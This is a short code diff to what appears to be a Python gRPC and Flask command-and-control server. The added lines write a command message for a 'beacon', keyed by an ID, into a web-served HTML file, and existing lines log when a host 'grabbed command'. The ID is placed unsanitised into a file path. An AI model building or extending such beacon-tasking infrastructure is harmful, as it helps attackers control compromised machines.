@@ -13,8 +13,12 @@ class RunFlask(pb2_grpc.UnaryServicer):
 
     def GetServerResponse(self, request, context):
 
-        # get the string from the incoming request
+        # We need an ID (ID for beacon) and message (What to tell the beacon)
         message = request.message
+        ID = request.ID
+        f = open(f"/var/www/html/{ID}.html", "a")
+        f.write(message)
+        f.close()
         result = f'Hello I am up and running received "{message}" message from you'
         result = {'message': result, 'received': True}
 
@@ -43,7 +47,7 @@ class RunFlask(pb2_grpc.UnaryServicer):
             val = {request.headers['APPSESSIONID']}
             print(f'Host {val} grabbed command')
             return send_from_directory('.', filename)
-            
+
 
         return jsonify(request.data)
 
